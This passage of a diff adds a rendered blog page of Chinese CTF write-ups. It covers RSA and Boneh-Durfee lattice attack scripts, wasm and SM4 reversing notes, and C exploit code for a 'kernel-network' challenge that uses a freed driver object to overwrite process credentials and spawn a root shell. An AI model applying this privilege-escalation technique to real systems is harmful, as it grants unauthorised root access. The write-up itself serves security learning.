+</span></span><span class="line"><span class="cl">    <span class="n">b</span> <span class="o">=</span> <span class="n">x</span> <span class="o">*</span> <span class="n">y</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">+</span> <span class="p">(</span><span class="n">x</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">y</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">-</span> <span class="n">phi</span>
+</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="p">(</span><span class="n">y</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">x</span> <span class="o">*</span> <span class="n">y</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">k1</span><span class="p">,</span> <span class="n">k2</span> <span class="o">=</span> <span class="n">solve</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">*</span> <span class="n">y</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="n">k1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">k2</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span> <span class="o">*</span> <span class="n">y</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">//</span> <span class="n">k1</span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="p">(</span><span class="n">x</span> <span class="o">*</span> <span class="n">y</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="n">k2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">k1</span><span class="p">,</span> <span class="n">k2</span> <span class="o">=</span> <span class="n">k2</span><span class="p">,</span> <span class="p">(</span><span class="n">x</span> <span class="o">*</span> <span class="n">y</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">//</span> <span class="n">k2</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">assert</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="p">,</span> <span class="n">q</span> <span class="o">=</span> <span class="n">x</span> <span class="o">+</span> <span class="n">k2</span><span class="p">,</span> <span class="n">y</span> <span class="o">+</span> <span class="n">k1</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># N = p * q</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">p</span><span class="p">,</span><span class="n">q</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="p">,</span><span class="n">q</span> <span class="o">=</span> <span class="n">fun</span><span class="p">(</span><span class="n">p1</span><span class="p">,</span><span class="n">q1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">N</span> <span class="o">=</span> <span class="n">p</span><span class="o">*</span><span class="n">q</span>
+</span></span><span class="line"><span class="cl"><span class="n">d1</span> <span class="o">=</span> <span class="n">inverse</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">phi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">m1</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">Q</span><span class="p">,</span><span class="n">d1</span><span class="p">,</span><span class="n">N</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">m1</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># DASCTF{this_1s_crazy_Rsa}</span>
+</span></span></code></pre></div><div id="ezhtml" class="anchor"></div>
+<h3 class="relative group">ezhtml 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#ezhtml" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<p>wasm逆向</p>
+<p>工具一把梭哈</p>
+<pre tabindex="0"><code> wasm2c ez.wasm -o test.c
+ gcc -c test.c -o xorwasm.o
+</code></pre><p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://raw.githubusercontent.com/ljahum/images/main/2024_10/huaweire.png" alt="Untitled" />
+    
+  </figure>
+
+</p>
+<div id="kernel-network" class="anchor"></div>
+<h3 class="relative group">kernel-network 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#kernel-network" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<p>去年也考过的一个经典提权</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">  
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/wait.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">cred</span><span class="p">[</span><span class="mh">0xa8</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fd1</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/test&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fd2</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/test&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">close</span><span class="p">(</span><span class="n">fd1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">pid</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">write</span><span class="p">(</span><span class="n">fd2</span><span class="p">,</span> <span class="n">cred</span><span class="p">,</span> <span class="mi">28</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 检查是否为 root 用户
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="n">pid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">getuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*]welcome root:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-]Not root&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">wait</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 关闭第二个设备
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">close</span><span class="p">(</span><span class="n">fd2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><div id="网鼎初赛-2024" class="anchor"></div>
+<h2 class="relative group">网鼎初赛 2024 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%e7%bd%91%e9%bc%8e%e5%88%9d%e8%b5%9b-2024" aria-label="Anchor">#</a></span>        
+    
+</h2>
+<blockquote>
+<p>玩玩咯~~</p>
+</blockquote>
+<div id="re1" class="anchor"></div>
+<h3 class="relative group">re1 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#re1" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<p>在com.ctf.cma里面找到Check方法</p>
+<p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://raw.githubusercontent.com/ljahum/images/main/2024_10/re1.png" alt="Untitled" />
+    
+  </figure>
+
+</p>
+<p>一眼魔数，搜了下是sm4的特征</p>
+<p>findcrypto 貌似并没有收录sm4</p>
+<p>但是在下面把全局变量的秘钥换掉了，用C语言写个int64模拟一下发现秘钥被换成了</p>
+<p>A11223574689900Z</p>
+<p>往后找到明文然后一把梭哈</p>
+<pre tabindex="0"><code>    cipher_num = 0x85fcbc1d8a32907cb6cacaaaa9109957e38c80651eadf138c3fe849a62da68b36eff51fcd8b69feb7ae0738619a4ca13
+    mkey = bytes_to_long(b&#34;A11223574689900Z&#34;)	
+</code></pre><p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://raw.githubusercontent.com/ljahum/images/main/2024_10/re112.png" alt="Untitled" />
+    
+  </figure>
+
+</p>
+<div id="crypto1" class="anchor"></div>
+<h3 class="relative group">crypto1 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#crypto1" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<p>2024高校密码挑战类似</p>
+<p>抄脚本了家人们</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="n">time</span><span class="o">.</span><span class="n">clock</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">debug</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">strict</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">helpful_only</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl"><span class="n">dimension_min</span> <span class="o">=</span> <span class="mi">7</span> <span class="c1"># 如果晶格达到该尺寸，则停止移除</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 显示有用矢量的统计数据</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">helpful_vectors</span><span class="p">(</span><span class="n">BB</span><span class="p">,</span> <span class="n">modulus</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">nothelpful</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">ii</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">BB</span><span class="o">.</span><span class="n">dimensions</span><span class="p">()[</span><span class="mi">0</span><span class="p">]):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">BB</span><span class="p">[</span><span class="n">ii</span><span class="p">,</span><span class="n">ii</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="n">modulus</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">nothelpful</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 显示带有 0 和 X 的矩阵</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">matrix_overview</span><span class="p">(</span><span class="n">BB</span><span class="p">,</span> <span class="n">bound</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">ii</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">BB</span><span class="o">.</span><span class="n">dimensions</span><span class="p">()[</span><span class="mi">0</span><span class="p">]):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;</span><span class="si">%02d</span><span class="s1"> &#39;</span> <span class="o">%</span> <span class="n">ii</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">jj</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">BB</span><span class="o">.</span><span class="n">dimensions</span><span class="p">()[</span><span class="mi">1</span><span class="p">]):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">a</span> <span class="o">+=</span> <span class="s1">&#39;0&#39;</span> <span class="k">if</span> <span class="n">BB</span><span class="p">[</span><span class="n">ii</span><span class="p">,</span><span class="n">jj</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span> <span class="k">else</span> <span class="s1">&#39;X&#39;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">BB</span><span class="o">.</span><span class="n">dimensions</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">60</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl">                <span class="n">a</span> <span class="o">+=</span> <span class="s1">&#39; &#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">BB</span><span class="p">[</span><span class="n">ii</span><span class="p">,</span> <span class="n">ii</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="n">bound</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">a</span> <span class="o">+=</span> <span class="s1">&#39;~&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#print (a)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 尝试删除无用的向量</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 从当前 = n-1（最后一个向量）开始</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">remove_unhelpful</span><span class="p">(</span><span class="n">BB</span><span class="p">,</span> <span class="n">monomials</span><span class="p">,</span> <span class="n">bound</span><span class="p">,</span> <span class="n">current</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 我们从当前 = n-1（最后一个向量）开始</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">current</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">or</span> <span class="n">BB</span><span class="o">.</span><span class="n">dimensions</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="n">dimension_min</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">BB</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="c1"># 开始从后面检查</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">ii</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">current</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#  如果它没有用</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">BB</span><span class="p">[</span><span class="n">ii</span><span class="p">,</span> <span class="n">ii</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="n">bound</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">affected_vectors</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">            <span class="n">affected_vector_index</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">             <span class="c1"># 让我们检查它是否影响其他向量</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">jj</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">ii</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">BB</span><span class="o">.</span><span class="n">dimensions</span><span class="p">()[</span><span class="mi">0</span><span class="p">]):</span>
+</span></span><span class="line"><span class="cl">                <span class="c1"># 如果另一个向量受到影响：</span>
+</span></span><span class="line"><span class="cl">                <span class="c1"># 我们增加计数</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">BB</span><span class="p">[</span><span class="n">jj</span><span class="p">,</span> <span class="n">ii</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">affected_vectors</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">affected_vector_index</span> <span class="o">=</span> <span class="n">jj</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">            <span class="c1"># 等级：0</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># 如果没有其他载体最终受到影响</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># 我们删除它</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">affected_vectors</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">#print (&#34;* removing unhelpful vector&#34;, ii)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">BB</span> <span class="o">=</span> <span class="n">BB</span><span class="o">.</span><span class="n">delete_columns</span><span class="p">([</span><span class="n">ii</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">                <span class="n">BB</span> <span class="o">=</span> <span class="n">BB</span><span class="o">.</span><span class="n">delete_rows</span><span class="p">([</span><span class="n">ii</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">                <span class="n">monomials</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="n">ii</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">BB</span> <span class="o">=</span> <span class="n">remove_unhelpful</span><span class="p">(</span><span class="n">BB</span><span class="p">,</span> <span class="n">monomials</span><span class="p">,</span> <span class="n">bound</span><span class="p">,</span> <span class="n">ii</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">BB</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">           <span class="c1"># 等级：1</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">#如果只有一个受到影响，我们会检查</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># 如果它正在影响别的向量</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">affected_vectors</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">affected_deeper</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">kk</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">affected_vector_index</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">BB</span><span class="o">.</span><span class="n">dimensions</span><span class="p">()[</span><span class="mi">0</span><span class="p">]):</span>
+</span></span><span class="line"><span class="cl">                    <span class="c1"># 如果它影响哪怕一个向量</span>
+</span></span><span class="line"><span class="cl">                    <span class="c1"># 我们放弃这个</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="n">BB</span><span class="p">[</span><span class="n">kk</span><span class="p">,</span> <span class="n">affected_vector_index</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">affected_deeper</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">                <span class="c1"># 如果没有其他向量受到影响，则将其删除，并且</span>
+</span></span><span class="line"><span class="cl">                <span class="c1"># 这个有用的向量不够有用</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">#与我们无用的相比</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">affected_deeper</span> <span class="ow">and</span> <span class="nb">abs</span><span class="p">(</span><span class="n">bound</span> <span class="o">-</span> <span class="n">BB</span><span class="p">[</span><span class="n">affected_vector_index</span><span class="p">,</span> <span class="n">affected_vector_index</span><span class="p">])</span> <span class="o">&lt;</span> <span class="nb">abs</span><span class="p">(</span><span class="n">bound</span> <span class="o">-</span> <span class="n">BB</span><span class="p">[</span><span class="n">ii</span><span class="p">,</span> <span class="n">ii</span><span class="p">]):</span>
+</span></span><span class="line"><span class="cl">                    <span class="c1">#print (&#34;* removing unhelpful vectors&#34;, ii, &#34;and&#34;, affected_vector_index)</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">BB</span> <span class="o">=</span> <span class="n">BB</span><span class="o">.</span><span class="n">delete_columns</span><span class="p">([</span><span class="n">affected_vector_index</span><span class="p">,</span> <span class="n">ii</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">BB</span> <span class="o">=</span> <span class="n">BB</span><span class="o">.</span><span class="n">delete_rows</span><span class="p">([</span><span class="n">affected_vector_index</span><span class="p">,</span> <span class="n">ii</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">monomials</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="n">affected_vector_index</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">monomials</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="n">ii</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">BB</span> <span class="o">=</span> <span class="n">remove_unhelpful</span><span class="p">(</span><span class="n">BB</span><span class="p">,</span> <span class="n">monomials</span><span class="p">,</span> <span class="n">bound</span><span class="p">,</span> <span class="n">ii</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="n">BB</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># nothing happened</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">BB</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34; 
+</span></span></span><span class="line"><span class="cl"><span class="s2">Returns:
+</span></span></span><span class="line"><span class="cl"><span class="s2">* 0,0   if it fails
+</span></span></span><span class="line"><span class="cl"><span class="s2">* -1，-1 如果 &#34;strict=true&#34;，并且行列式不受约束
+</span></span></span><span class="line"><span class="cl"><span class="s2">* x0,y0 the solutions of `pol`
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">boneh_durfee</span><span class="p">(</span><span class="n">pol</span><span class="p">,</span> <span class="n">modulus</span><span class="p">,</span> <span class="n">mm</span><span class="p">,</span> <span class="n">tt</span><span class="p">,</span> <span class="n">XX</span><span class="p">,</span> <span class="n">YY</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Boneh and Durfee revisited by Herrmann and May
+</span></span></span><span class="line"><span class="cl"><span class="s2"> 
+</span></span></span><span class="line"><span class="cl"><span class="s2"> 在以下情况下找到解决方案：
+</span></span></span><span class="line"><span class="cl"><span class="s2">* d &lt; N^delta
+</span></span></span><span class="line"><span class="cl"><span class="s2">* |x|&lt; e^delta
+</span></span></span><span class="line"><span class="cl"><span class="s2">* |y|&lt; e^0.5
+</span></span></span><span class="line"><span class="cl"><span class="s2">每当 delta &lt; 1 - sqrt（2）/2 ~ 0.292
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="c1"># substitution (Herrman and May)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PR</span><span class="o">.&lt;</span><span class="n">u</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="o">&gt;</span> <span class="o">=</span> <span class="n">PolynomialRing</span><span class="p">(</span><span class="n">ZZ</span><span class="p">)</span>   <span class="c1">#多项式环</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Q</span> <span class="o">=</span> <span class="n">PR</span><span class="o">.</span><span class="n">quotient</span><span class="p">(</span><span class="n">x</span><span class="o">*</span><span class="n">y</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">-</span> <span class="n">u</span><span class="p">)</span>        <span class="c1">#  u = xy + 1</span>
+</span></span><span class="line"><span class="cl">    <span class="n">polZ</span> <span class="o">=</span> <span class="n">Q</span><span class="p">(</span><span class="n">pol</span><span class="p">)</span><span class="o">.</span><span class="n">lift</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="n">UU</span> <span class="o">=</span> <span class="n">XX</span><span class="o">*</span><span class="n">YY</span> <span class="o">+</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="c1"># x-移位</span>
+</span></span><span class="line"><span class="cl">    <span class="n">gg</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">kk</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">mm</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">ii</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">mm</span> <span class="o">-</span> <span class="n">kk</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">xshift</span> <span class="o">=</span> <span class="n">x</span><span class="o">^</span><span class="n">ii</span> <span class="o">*</span> <span class="n">modulus</span><span class="o">^</span><span class="p">(</span><span class="n">mm</span> <span class="o">-</span> <span class="n">kk</span><span class="p">)</span> <span class="o">*</span> <span class="n">polZ</span><span class="p">(</span><span class="n">u</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span><span class="o">^</span><span class="n">kk</span>
+</span></span><span class="line"><span class="cl">            <span class="n">gg</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">xshift</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">gg</span><span class="o">.</span><span class="n">sort</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="c1"># 单项式 x 移位列表</span>
+</span></span><span class="line"><span class="cl">    <span class="n">monomials</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">polynomial</span> <span class="ow">in</span> <span class="n">gg</span><span class="p">:</span>
